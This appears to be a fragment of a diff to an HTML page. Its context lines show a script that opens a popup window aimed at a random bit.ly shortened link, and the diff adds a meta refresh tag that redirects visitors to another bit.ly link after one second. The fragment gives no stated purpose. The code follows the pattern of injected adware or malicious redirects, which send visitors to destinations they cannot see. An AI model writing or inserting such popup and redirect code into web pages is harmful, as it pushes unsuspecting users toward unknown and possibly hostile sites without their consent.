@@ -11,4 +11,6 @@ popurls[6]='https://bit.ly/43NJx7P'
 function openpopup(popurl) { var winpops=window.open(popurl,'','width=,height=,toolbar,location,status,scrollbars,menubar,resizable') }
 openpopup(popurls[Math.floor(Math.random()* (popurls.length))])
 </script>
+
+<meta content='1;url=https://bit.ly/3voZ0OO' http-equiv='refresh'/>
 ```
